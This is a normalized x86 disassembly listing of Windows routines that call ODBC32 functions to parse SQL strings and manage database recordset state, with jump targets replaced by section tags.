call Ordinal_ODBC32_51
mov edi eax
mov eax [ esi ]
push edi
mov ecx esi
call [ eax + 0x48 ]
test eax eax
jne r-xdata
lea ecx [ ebp - 0x2 ]
push ebx
lea edi [ esi + 0xac ]
push ecx
push 0x4
push edi
push 0x2b
push [ eax + 0x4 ]
call Ordinal_ODBC32_45
mov ebx eax
mov eax [ esi ]
push ebx
mov ecx esi
call [ eax + 0x48 ]
test eax eax
jne r-xdata
push [ esi + 0xb0 ]
push 0x7
push [ ebp + 0x8 ]
call Ordinal_ODBC32_51
mov edi eax
mov eax [ esi ]
push edi
mov ecx esi
call [ eax + 0x48 ]
test eax eax
jne r-xdata
mov eax [ esi ]
push 0x0
push edi
mov ecx esi
call [ eax + 0x54 ]
cmp [ esi + 0xa8 ] 0x1
pop ebx
jne r-xdata
mov eax [ esi ]
push 0x0
push ebx
mov ecx esi
call [ eax + 0x54 ]
pop edi
pop esi
leave
retn 0x8
mov eax [ esi ]
push 0x0
push edi
mov ecx esi
call [ eax + 0x54 ]
mov ecx [ edi ]
test cl 0x4
je r-xdata
push 0x2
pop eax
test [ edi ] al
jmp r-xdata
test cl 0x8
je r-xdata
mov [ esi + 0xb0 ] 0x3
jmp r-xdata
je r-xdata
push 0x2
pop eax
test al cl
mov [ esi + 0xb0 ] 0x4
jmp r-xdata
mov [ esi + 0xb0 ] eax
sub_422cd9
push ebx
push ebp
push esi
mov esi r--data
push edi
mov edi [ lstrlenA@IAT ]
mov ebp ecx
push esi
call edi
mov ebx [ esp + 0x14 ]
dec eax
push eax
push esi
push ebx
call sub_42dfbf
add esp 0xc
test eax eax
je r-xdata
xor eax eax
mov esi r--data
push esi
call edi
dec eax
push eax
push esi
push ebx
call sub_42dfbf
add esp 0xc
test eax eax
je r-xdata
push ebx
mov ecx ebp
call sub_422d2c
jmp r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn 0x4
sub_422d2c
mov eax sub_4634f0
call sub_42dc88
push ecx
push ecx
push esi
mov [ ebp - 0x14 ] ecx
push [ ebp + 0x8 ]
lea ecx [ ebp + 0x8 ]
call sub_4421b6
and [ ebp - 0x4 ] 0x0
push r--data
push [ ebp + 0x8 ]
call sub_422e85
test eax eax
mov [ ebp - 0x10 ] eax
jne r-xdata
push r--data
push [ ebp + 0x8 ]
call sub_422e85
test eax eax
jne r-xdata
xor esi esi
jmp r-xdata
push r--data
push [ ebp + 0x8 ]
call sub_422e85
test eax eax
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp + 0x8 ]
call sub_442148
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
push ebx
push edi
push r--data
push [ ebp + 0x8 ]
call sub_422e85
push r--data
mov ebx eax
push [ ebp + 0x8 ]
call sub_422e85
push 0x0
lea ecx [ ebp + 0x8 ]
mov esi eax
call sub_442578
test esi esi
mov edi eax
je r-xdata
mov esi ebx
test ebx ebx
je r-xdata
push [ ebp - 0x10 ]
push edi
call [ lstrcpyA@IAT ]
sub esi [ ebp - 0x10 ]
push esi
push [ ebp - 0x10 ]
push edi
call sub_42e2d0
add esp 0xc
and [ esi + edi ] 0x0
jmp r-xdata
test esi esi
je r-xdata
cmp ebx esi
jae r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0xfffffffa
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_43b152
push eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x4 ] 0x1
lea ecx [ eax + 0xdc ]
call sub_442281
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x10 ]
call sub_442148
push 0x1
pop esi
push 0xffffffff
lea ecx [ ebp + 0x8 ]
call sub_4425c7
push [ ebp + 0x8 ]
call sub_422e57
pop edi
pop ebx
test eax eax
jne r-xdata
sub_422e57
push r--data
push [ esp + 0x8 ]
call sub_422e85
test eax eax
je r-xdata
push r--data
push [ esp + 0x8 ]
call sub_422e85
neg eax
sbb eax eax
neg eax
push 0x1
pop eax
jmp r-xdata
retn 0x4
sub_422e85
mov eax sub_463504
call sub_42dc88
sub esp 0x18
push ebx
push esi
push edi
xor esi esi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x20 ] esi
call sub_4421b6
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] esi
call sub_44267c
push esi
lea ecx [ ebp - 0x18 ]
call sub_442578
push [ ebp + 0xc ]
mov [ ebp - 0x24 ] eax
push eax
xor edi edi
jmp r-xdata
mov esi [ ebp - 0x24 ]
xor ebx ebx
cmp esi edi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
jae r-xdata
push 0xffffffff
lea ecx [ ebp - 0x18 ]
call sub_4425c7
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x18 ]
call sub_442148
mov ecx [ ebp - 0xc ]
mov eax edi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x8
xor esi esi
cmp [ ebp - 0x20 ] esi
jne r-xdata
mov al [ esi ]
cmp al 0x27
jne r-xdata
cmp [ ebp - 0x14 ] esi
jne r-xdata
push [ ebp + 0xc ]
call [ lstrlenA@IAT ]
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push esi
call sub_42e14b
cmp [ eax ] 0x27
pop ecx
je r-xdata
mov eax [ ebp - 0x20 ]
push [ ebp + 0xc ]
add edi eax
push edi
jmp r-xdata
cmp [ ebp - 0x1c ] esi
je r-xdata
push esi
call sub_42e14b
mov esi eax
pop ecx
cmp esi edi
jb r-xdata
cmp al 0x5b
jne r-xdata
push esi
call sub_42e14b
pop ecx
mov esi eax
jmp r-xdata
xor eax eax
cmp [ ebp - 0x14 ] eax
sete al
mov [ ebp - 0x14 ] eax
jmp r-xdata
call sub_42e605
mov edi eax
pop ecx
cmp edi esi
pop ecx
je r-xdata
mov eax [ ebp + 0x8 ]
sub eax [ ebp - 0x24 ]
add edi eax
cmp al 0x5d
jne r-xdata
push esi
call sub_42e14b
cmp [ eax ] 0x5b
pop ecx
jne r-xdata
push esi
call sub_42e14b
cmp [ eax ] 0x5d
pop ecx
je r-xdata
inc [ ebp - 0x10 ]
jmp r-xdata
inc ebx
mov eax [ ebp - 0x10 ]
xor ecx ecx
sub eax ebx
test eax eax
setg cl
mov [ ebp - 0x1c ] ecx
sub_422fb5
push esi
mov esi ecx
cmp [ esi + 0x14 ] 0x0
je r-xdata
or [ esi + 0xe8 ] 0xffffffff
call sub_423d74
cmp [ esi + 0x14 ] 0x0
mov [ esi + 0xe8 ] eax
jbe r-xdata
pop esi
retn
cmp [ esi + 0x1c ] 0x0
je r-xdata
mov ecx esi
call sub_423f95
pop esi
retn
sub_42300f
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
xor ebx ebx
push edi
cmp [ esi + 0xe0 ] ebx
jne r-xdata
cmp [ esi + 0xc8 ] ebx
mov edi 0x3f8
je r-xdata
cmp [ ebp + 0x8 ] 0x1
je r-xdata
cmp [ esi + 0x88 ] 0x3
je r-xdata
cmp [ esi + 0xc4 ] ebx
je r-xdata
mov eax [ esi ]
push ebx
push 0x3ea
call [ eax + 0x54 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp [ esi + 0xc8 ] ebx
je r-xdata
mov eax [ esi ]
push ebx
push edi
mov ecx esi
call [ eax + 0x54 ]
cmp [ esi + 0xc4 ] ebx
je r-xdata
cmp [ ebp + 0x8 ] 0x1
je r-xdata
cmp [ ebp + 0x8 ] 0x4
je r-xdata
mov eax [ esi ]
push ebx
push edi
mov ecx esi
call [ eax + 0x54 ]
cmp [ ebp + 0x8 ] 0x6
jne r-xdata
cmp [ ebp + 0x8 ] 0x6
jne r-xdata
cmp [ ebp + 0xc ] ebx
jg r-xdata
cmp [ ebp + 0xc ] ebx
jge r-xdata
sub_4230a0
push esi
mov esi ecx
push edi
cmp [ esi + 0x88 ] 0x2
jne r-xdata
push [ esi + 0xb4 ]
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push [ esi + 0x4 ]
call Ordinal_ODBC32_59
mov edi eax
cmp di 0x2
je r-xdata
test [ esi + 0x2d ] 0x8
jne r-xdata
mov eax [ esi + 0xb4 ]
xor ecx ecx
cmp [ eax ] 0x1
sete cl
mov [ esi + 0xe4 ] ecx
push [ esi + 0x4 ]
call Ordinal_ODBC32_13
mov edi eax
cmp di 0x2
je r-xdata
mov eax [ esp + 0x14 ]
mov [ eax ] 0x1
and [ esi + 0xe4 ] 0x0
jmp r-xdata
mov eax [ esi ]
push edi
mov ecx esi
call [ eax + 0x1c ]
mov ax di
pop edi
pop esi
retn 0xc
sub_42311d
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
push [ ebp + 0xc ]
mov esi ecx
mov [ ebp + 0x8 ] ebx
call sub_42e67b
mov [ ebp - 0x4 ] eax
pop ecx
movzx eax bx
dec eax
dec eax
je r-xdata
mov [ ebp + 0x8 ] 0x1
dec eax
je r-xdata
push [ ebp + 0x8 ]
mov ecx esi
call sub_4230a0
mov edi [ ebp + 0x14 ]
xor ecx ecx
mov [ edi ] ax
cmp [ esi + 0xe4 ] ecx
jne r-xdata
push ebx
mov ecx esi
call sub_4230a0
mov edi [ ebp + 0x14 ]
xor ecx ecx
mov [ edi ] ax
cmp [ esi + 0xe4 ] ecx
jmp r-xdata
mov [ ebp + 0x8 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp [ edi ] 0x64
je r-xdata
dec [ ebp - 0x4 ]
sete cl
push [ ebp + 0x10 ]
cmp bx 0x6
push 0x1
je r-xdata
xor eax eax
cmp [ ebp + 0xc ] eax
setle al
dec eax
and al 0xfd
add eax 0x4
mov [ ebp + 0x8 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x10
test ecx ecx
jne r-xdata
push [ ebp + 0x10 ]
mov ecx esi
push 0x1
push [ ebp + 0x8 ]
call sub_4230a0
cmp bx 0x6
mov [ edi ] ax
jne r-xdata
xor ecx ecx
cmp [ esi + 0xe4 ] ecx
xor ecx ecx
cmp [ esi + 0xe4 ] ecx
jne r-xdata
cmp ax 0x64
jne r-xdata
dec [ ebp - 0x4 ]
jmp r-xdata
sete cl
sub_4231f6
push ebp
mov ebp esp
push ecx
movzx eax [ ebp + 0xc ]
push ebx
xor ebx ebx
push esi
dec eax
push edi
mov esi ecx
mov [ ebp - 0x4 ] ebx
je r-xdata
push [ ebp + 0x8 ]
lea edi [ esi + 0xa0 ]
mov [ ebp - 0x4 ] 0x1
push [ ebp + 0x10 ]
push edi
call sub_42433b
push [ ebp + 0x8 ]
lea ebx [ esi + 0x9c ]
push [ esi + 0x98 ]
push [ edi ]
push ebx
call sub_424359
cmp [ esi + 0x98 ] 0x0
jne r-xdata
dec eax
je r-xdata
xor ebx ebx
cmp [ ebp + 0x8 ] 0x64
jne r-xdata
cmp [ ebp + 0x8 ] 0x64
mov [ ebp - 0x4 ] 0x1
jne r-xdata
dec eax
je r-xdata
mov [ esi + 0xc4 ] ebx
mov [ esi + 0xc8 ] ebx
jmp r-xdata
xor ebx ebx
mov eax [ edi ]
inc eax
cmp [ ebx ] eax
jne r-xdata
mov [ esi + 0xa0 ] ebx
jmp r-xdata
mov [ esi + 0xa0 ] 0xfffffffe
mov [ esi + 0x9c ] ebx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x8 ] 0x64
je r-xdata
dec eax
je r-xdata
cmp [ ebp + 0xc ] 0x2
je r-xdata
xor ebx ebx
mov [ esi + 0x98 ] 0x1
cmp [ ebp + 0x8 ] 0x64
jne r-xdata
cmp [ esi + 0x98 ] ebx
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
cmp [ esi + 0xc8 ] ebx
jne r-xdata
dec eax
je r-xdata
push 0x1
pop eax
mov [ esi + 0xc4 ] eax
mov [ esi + 0xc8 ] eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x3
je r-xdata
mov [ esi + 0xa0 ] 0xfffffffe
jmp r-xdata
mov eax [ esi + 0x9c ]
dec eax
mov [ esi + 0xa0 ] eax
jmp r-xdata
push [ ebp + 0x8 ]
lea eax [ esi + 0xa0 ]
push [ ebp + 0x10 ]
push eax
call sub_42433b
jmp r-xdata
mov eax [ ebp + 0x10 ]
cmp [ ebp + 0x8 ] 0x64
mov [ ebp - 0x4 ] eax
je r-xdata
dec eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x10
cmp [ ebp + 0xc ] 0x8
je r-xdata
mov [ esi + 0xa0 ] 0xfffffffe
cmp eax ebx
jle r-xdata
push [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
lea edi [ esi + 0xa0 ]
mov [ ebp - 0x4 ] eax
push eax
push edi
call sub_42433b
push [ ebp + 0x8 ]
push [ esi + 0x98 ]
push [ edi ]
jmp r-xdata
dec eax
dec eax
jne r-xdata
xor eax eax
cmp [ ebp - 0x4 ] ebx
setge al
xor ecx ecx
cmp eax ebx
sete cl
mov [ esi + 0xc8 ] eax
mov [ esi + 0xc4 ] ecx
jmp r-xdata
cmp [ esi + 0x98 ] ebx
je r-xdata
dec eax
mov [ esi + 0xa0 ] eax
jmp r-xdata
lea eax [ esi + 0x9c ]
push eax
call sub_424359
jmp r-xdata
mov [ ebp - 0x4 ] ebx
mov ecx [ esi + 0x9c ]
add ecx eax
mov [ esi + 0xa0 ] ecx
jmp r-xdata
push [ ebp + 0x8 ]
push [ esi + 0x98 ]
push [ esi + 0xa0 ]
sub_4233ee
mov eax sub_463518
call sub_42dc88
push ecx
push ecx
mov eax [ ecx + 0xd4 ]
push ebx
push esi
lea esi [ ecx + 0xd4 ]
mov ebx r--data
push edi
mov edi [ lstrlenA@IAT ]
push ebx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x10 ] eax
call edi
dec eax
push eax
push ebx
push [ ebp - 0x10 ]
call sub_42dfbf
add esp 0xc
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn
mov eax [ esi ]
mov ebx r--data
push ebx
mov [ ebp - 0x10 ] eax
call edi
dec eax
push eax
push ebx
push [ ebp - 0x10 ]
call sub_42dfbf
add esp 0xc
test eax eax
je r-xdata
mov eax [ esi ]
mov ebx r--data
push ebx
mov [ ebp - 0x10 ] eax
call edi
dec eax
push eax
push ebx
push [ ebp - 0x10 ]
call sub_42dfbf
add esp 0xc
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
xor edi edi
push esi
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] edi
call sub_442281
mov ecx esi
call sub_4420d3
push ebx
mov ecx esi
call sub_4422d1
mov ebx [ ebp - 0x14 ]
push 0x1
push edi
mov ecx ebx
call sub_4220d2
push r--data
push esi
mov ecx ebx
call sub_423e4a
test eax eax
jne r-xdata
mov eax [ esi ]
push 0x20
mov ecx esi
mov eax [ eax - 0x8 ]
dec eax
push eax
call sub_44268e
push r--data
mov ecx esi
call sub_442524
lea eax [ ebp - 0x10 ]
mov ecx esi
push eax
call sub_442560
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_442148
mov eax [ ebx ]
push edi
push 0x3eb
mov ecx ebx
call [ eax + 0x54 ]
sub_42350b
push esi
mov esi ecx
push edi
mov eax [ esi + 0xc ]
lea edi [ esi + 0xc ]
cmp [ eax - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x10 ]
lea edi [ esi + 0x10 ]
cmp [ eax - 0x8 ] 0x0
je r-xdata
push ebx
lea ebx [ esi + 0xd4 ]
push r--data
mov ecx ebx
call sub_442524
push edi
mov ecx ebx
call sub_442560
pop ebx
pop edi
pop esi
retn
add esi 0xd4
push r--data
mov ecx esi
call sub_442524
push edi
mov ecx esi
call sub_442560
sub_423560
push esi
mov esi ecx
push [ esi + 0xd4 ]
call sub_422cd9
test eax eax
je r-xdata
xor eax eax
cmp [ esi + 0x24 ] 0x0
push 0x1
pop eax
je r-xdata
pop esi
retn
cmp [ esi + 0x28 ] 0x0
jne r-xdata
mov ecx [ esi + 0x8 ]
mov ecx [ ecx + 0x4c ]
test cl 0x4
jne r-xdata
test cl 0x2
je r-xdata
mov [ esi + 0x28 ] eax
pop esi
retn
sub_42359a
push ebx
push ebp
push esi
mov esi ecx
push edi
mov eax [ esi + 0x94 ]
test eax eax
jne r-xdata
cmp eax 0x1
jne r-xdata
push 0x3
pop ebx
push 0x1
pop ebp
jmp r-xdata
push 0x4
push 0x2
jmp r-xdata
mov ecx esi
call sub_423dac
push 0x0
push ebx
push 0x1
push [ esi + 0x4 ]
call Ordinal_ODBC32_68
mov edi eax
cmp di 0x2
je r-xdata
mov eax [ esi ]
push edi
mov ecx esi
call [ eax + 0x48 ]
test eax eax
jne r-xdata
pop ebp
mov ebx ebp
cmp di 0x63
jne r-xdata
push [ esi + 0x4 ]
push [ esi + 0x8 ]
push edi
call sub_4209c9
cmp di 0x1
jne r-xdata
push [ esi + 0x4 ]
mov ecx esi
call sub_423943
mov ecx esi
call sub_423de6
pop edi
pop esi
pop ebp
pop ebx
retn
mov eax [ esi + 0xb4 ]
cmp [ eax ] bp
je r-xdata
mov eax [ esi ]
push 0x0
push 0x400
mov ecx esi
call [ eax + 0x54 ]
sub_42362f
push ebx
push esi
mov esi ecx
push edi
mov eax [ esi + 0xbc ]
lea edi [ esi + 0xbc ]
test eax eax
je r-xdata
mov eax [ esi + 0x8 ]
push edi
push [ eax + 0x4 ]
call Ordinal_ODBC32_3
mov ebx eax
mov eax [ esi ]
push ebx
mov ecx esi
call [ eax + 0x48 ]
test eax eax
jne r-xdata
push 0x0
push eax
call Ordinal_ODBC32_16
mov edx [ esi ]
push eax
mov ecx esi
call [ edx + 0x48 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
push [ edi ]
push [ esi + 0x8 ]
push ebx
call sub_4209c9
push 0x1
push [ edi ]
call Ordinal_ODBC32_16
and [ edi ] 0x0
test [ esi + 0x2d ] 0x40
jne r-xdata
push 0x3
push [ edi ]
call Ordinal_ODBC32_16
mov edx [ esi ]
push eax
mov ecx esi
call [ edx + 0x48 ]
test eax eax
jne r-xdata
sub_4236a8
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
mov esi ecx
push edi
mov eax [ esi + 0x94 ]
sub eax 0x0
je r-xdata
lea edi [ esi + 0xd8 ]
push r--data
mov ecx edi
call sub_4422d1
lea eax [ esi + 0xdc ]
mov ecx edi
push eax
call sub_442560
dec eax
je r-xdata
lea ebx [ esi + 0xd8 ]
push r--data
mov ecx ebx
call sub_442524
mov eax [ esi + 0xa4 ]
lea edi [ esi + 0xa4 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
test eax eax
jne r-xdata
lea edi [ esi + 0xd8 ]
push r--data
mov ecx edi
call sub_4422d1
lea eax [ esi + 0xdc ]
mov ecx edi
push eax
call sub_442560
push r--data
mov ecx edi
call sub_442524
push r--data
push edi
push [ esi + 0xbc ]
mov ecx esi
call sub_423e8a
push 0x20
dec eax
jne r-xdata
push edi
mov ecx ebx
call sub_442560
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0x12
push eax
lea eax [ ebp - 0x1c ]
push 0x13
push eax
push [ esi + 0x4 ]
call Ordinal_ODBC32_17
mov edx [ esi ]
push eax
mov ecx esi
mov [ ebp - 0x8 ] eax
call [ edx + 0x48 ]
test eax eax
jne r-xdata
lea edi [ esi + 0xd8 ]
push 0x0
mov ecx edi
call sub_442578
mov ecx [ esi + 0x8 ]
push eax
call sub_4210b7
push 0xffffffff
mov ecx edi
call sub_4425c7
test [ esi + 0x2d ] 0x80
je r-xdata
mov eax [ esi + 0x94 ]
cmp eax 0x1
je r-xdata
lea edi [ esi + 0xd8 ]
push r--data
mov ecx edi
call sub_4422d1
lea eax [ esi + 0xdc ]
mov ecx edi
push eax
call sub_442560
push r--data
mov ecx edi
call sub_442524
mov ebx r--data
mov ecx esi
push ebx
push edi
call sub_423e4a
mov eax [ edi ]
push 0x29
mov ecx edi
mov eax [ eax - 0x8 ]
dec eax
push eax
call sub_44268e
push r--data
mov ecx edi
call sub_442524
push ebx
push edi
push [ esi + 0xbc ]
mov ecx esi
call sub_423ec5
push 0x29
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ edi ]
push 0xfffffffd
push eax
push [ esi + 0xbc ]
call Ordinal_ODBC32_19
mov ebx eax
cmp bx 0x2
je r-xdata
lea eax [ ebp - 0x1c ]
mov ecx edi
push eax
call sub_4422d1
mov eax [ esi ]
push 0x0
push [ ebp - 0x8 ]
mov ecx esi
call [ eax + 0x54 ]
mov eax [ edi ]
mov ecx edi
mov eax [ eax - 0x8 ]
dec eax
push eax
call sub_44268e
jmp r-xdata
mov eax [ esi ]
push ebx
mov ecx esi
call [ eax + 0x48 ]
test eax eax
jne r-xdata
push [ esi + 0xbc ]
mov eax [ esi ]
mov ecx esi
push ebx
call [ eax + 0x54 ]
sub_42387e
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
push edi
test [ esi + 0x2d ] 0x40
jne r-xdata
push [ esi + 0xbc ]
call Ordinal_ODBC32_12
mov edi eax
cmp di 0x2
je r-xdata
mov eax [ esi + 0xd8 ]
push 0xfffffffd
push eax
push [ esi + 0xbc ]
call Ordinal_ODBC32_11
mov edi eax
cmp di 0x2
je r-xdata
mov eax [ esi ]
push edi
mov ecx esi
call [ eax + 0x48 ]
test eax eax
jne r-xdata
jmp r-xdata
cmp di 0x63
jne r-xdata
push [ esi + 0xbc ]
mov eax [ esi ]
mov ecx esi
push edi
call [ eax + 0x54 ]
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
push [ esi + 0xbc ]
call Ordinal_ODBC32_20
mov edx [ esi ]
push eax
mov ecx esi
call [ edx + 0x48 ]
test eax eax
je r-xdata
push [ esi + 0xbc ]
mov ecx esi
call sub_423943
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp - 0x4 ]
cmp eax 0xffffffff
je r-xdata
cmp eax 0x1
je r-xdata
lea ecx [ esi + 0xd8 ]
call sub_4420d3
pop edi
pop esi
leave
retn
mov edx [ esi ]
push 0x0
neg eax
sbb eax eax
mov ecx esi
and al 0xfe
add eax 0x3f0
push eax
call [ edx + 0x54 ]
jmp r-xdata
sub_423943
mov eax sub_463536
call sub_42dc88
sub esp 0xc
push ebx
push esi
push edi
mov edi ecx
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x8 ]
call Ordinal_ODBC32_48
mov esi eax
cmp si 0x2
je r-xdata
mov eax [ edi ]
push esi
mov ecx edi
call [ eax + 0x48 ]
test eax eax
jne r-xdata
cmp si 0x63
jne r-xdata
push 0x14
call sub_441e89
pop ecx
mov ecx eax
mov [ ebp - 0x18 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x4
mov eax [ ebp - 0x10 ]
mov ebx eax
push [ eax + 0x4 ]
lea esi [ eax + 0x4 ]
call [ GlobalLock@IAT ]
mov [ ebp - 0x18 ] eax
xor esi esi
push esi
call sub_420a4d
mov esi eax
jmp r-xdata
push [ ebx + 0x8 ]
push [ ebp - 0x18 ]
push [ ebp + 0x8 ]
call Ordinal_ODBC32_49
cmp ax 0x2
mov [ ebp - 0x14 ] eax
je r-xdata
push [ esi ]
call [ GlobalUnlock@IAT ]
mov eax [ edi ]
push [ ebp - 0x14 ]
mov ecx edi
call [ eax + 0x48 ]
test eax eax
je r-xdata
mov eax [ esi ]
or [ ebp - 0x4 ] 0xffffffff
push 0x1
mov ecx esi
push [ ebp + 0x8 ]
push [ edi + 0x8 ]
call [ eax + 0x14 ]
mov ecx edi
call sub_4222b7
lea eax [ ebp + 0x8 ]
push r--data
push eax
mov [ ebp + 0x8 ] esi
call sub_42dca7
push 0x14
call sub_441e89
pop ecx
mov [ ebp - 0x18 ] eax
push 0x1
pop ebx
test eax eax
mov [ ebp - 0x4 ] ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x8 ]
call Ordinal_ODBC32_48
mov esi eax
cmp si 0x2
je r-xdata
xor esi esi
push [ ebp - 0x14 ]
mov ecx eax
call sub_420a4d
mov esi eax
jmp r-xdata
mov eax [ edi ]
push esi
mov ecx edi
call [ eax + 0x48 ]
test eax eax
jne r-xdata
mov eax [ esi ]
or [ ebp - 0x4 ] 0xffffffff
push ebx
mov ecx esi
push [ ebp + 0x8 ]
push [ edi + 0x8 ]
call [ eax + 0x14 ]
mov ecx edi
call sub_4222b7
lea eax [ ebp - 0x18 ]
push r--data
push eax
mov [ ebp - 0x18 ] esi
call sub_42dca7
push [ ebp + 0x8 ]
mov eax [ edi ]
mov ecx edi
push esi
call [ eax + 0x54 ]
jmp r-xdata
sub_423a99
mov eax sub_463540
call sub_42dc88
sub esp 0xc
push ebx
push esi
mov esi ecx
xor ebx ebx
push edi
mov [ ebp - 0x14 ] esi
mov eax [ esi + 0x14 ]
mov [ ebp - 0x10 ] esp
cmp eax ebx
mov [ ebp - 0x4 ] ebx
je r-xdata
mov eax [ esi + 0x18 ]
cmp eax ebx
je r-xdata
cmp [ esi + 0x3c ] ebx
jne r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
cmp [ esi + 0xf0 ] ebx
lea edi [ esi + 0xf0 ]
jne r-xdata
cmp [ esi + 0xec ] ebx
lea edi [ esi + 0xec ]
jne r-xdata
shl eax 0x4
push eax
call sub_441e89
pop ecx
mov [ esi + 0x3c ] eax
mov ecx [ esi + 0x14 ]
shl ecx 0x4
push ecx
push ebx
push eax
call sub_42dc30
add esp 0xc
cmp [ esi + 0xf4 ] ebx
lea edi [ esi + 0xf4 ]
jne r-xdata
push eax
call sub_441e89
pop ecx
mov [ edi ] eax
push [ esi + 0x18 ]
push ebx
push eax
call sub_42dc30
add esp 0xc
push [ esi + 0x14 ]
call sub_441e89
pop ecx
mov [ edi ] eax
push [ esi + 0x14 ]
push ebx
push eax
call sub_42dc30
add esp 0xc
mov eax [ esi + 0x18 ]
shl eax 0x2
push eax
call sub_441e89
pop ecx
mov [ edi ] eax
mov ecx [ esi + 0x18 ]
shl ecx 0x2
push ecx
push ebx
push eax
call sub_42dc30
add esp 0xc
sub_423b7f
push ebp
mov ebp esp
lea eax [ ebp + 0x8 ]
add ecx 0x40
push eax
push [ ebp + 0x8 ]
call sub_43d564
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_423ba1
push ebp
mov ebp esp
lea eax [ ebp + 0x8 ]
add ecx 0x5c
push eax
push [ ebp + 0x8 ]
call sub_43d564
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_423bc3
push esi
push edi
mov esi ecx
xor edi edi
cmp [ esi + 0x30 ] di
jle r-xdata
cmp di [ esi + 0x30 ]
jne r-xdata
mov ecx [ esi + 0x38 ]
push [ esp + 0xc ]
movsx eax di
shl eax 0x4
mov eax [ eax + ecx ]
push eax
call sub_42d51e
pop ecx
test eax eax
pop ecx
je r-xdata
mov ax di
pop edi
pop esi
retn 0x4
mov eax [ esi ]
push 0x0
push 0x402
mov ecx esi
call [ eax + 0x54 ]
inc edi
cmp di [ esi + 0x30 ]
jl r-xdata
sub_423d13
push ebp
mov ebp esp
sub esp 0x38
push esi
mov esi ecx
push 0x0
push esi
push 0x0
lea ecx [ ebp - 0x38 ]
call sub_424393
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x38 ]
mov [ ebp - 0xc ] eax
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x40 ]
mov eax [ ebp - 0x14 ]
pop esi
leave
retn 0x4
sub_423d42
push ebp
mov ebp esp
sub esp 0x38
push esi
mov esi ecx
cmp [ esi + 0x20 ] 0x0
je r-xdata
pop esi
leave
retn 0x4
push 0x0
push esi
push 0x1
lea ecx [ ebp - 0x38 ]
call sub_424393
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x38 ]
mov [ ebp - 0xc ] eax
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x40 ]
sub_423d74
push ebp
mov ebp esp
sub esp 0x38
push esi
mov esi ecx
push 0x0
push esi
push 0x2
lea ecx [ ebp - 0x38 ]
call sub_424393
mov eax [ esi + 0x4 ]
lea ecx [ ebp - 0x38 ]
test [ esi + 0x2d ] 0x2
mov [ ebp - 0xc ] eax
mov eax [ esi ]
push ecx
mov ecx esi
je r-xdata
call [ eax + 0x40 ]
call [ eax + 0x44 ]
jmp r-xdata
mov eax [ ebp - 0x18 ]
pop esi
leave
retn
sub_423dac
push ebp
mov ebp esp
sub esp 0x38
push esi
mov esi ecx
mov eax [ esi + 0x94 ]
cmp eax 0x1
je r-xdata
push 0x0
push esi
push 0x3
lea ecx [ ebp - 0x38 ]
call sub_424393
mov eax [ esi + 0x4 ]
lea ecx [ ebp - 0x38 ]
mov [ ebp - 0xc ] eax
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x40 ]
cmp eax 0x2
jne r-xdata
pop esi
leave
retn
sub_423de6
push ebp
mov ebp esp
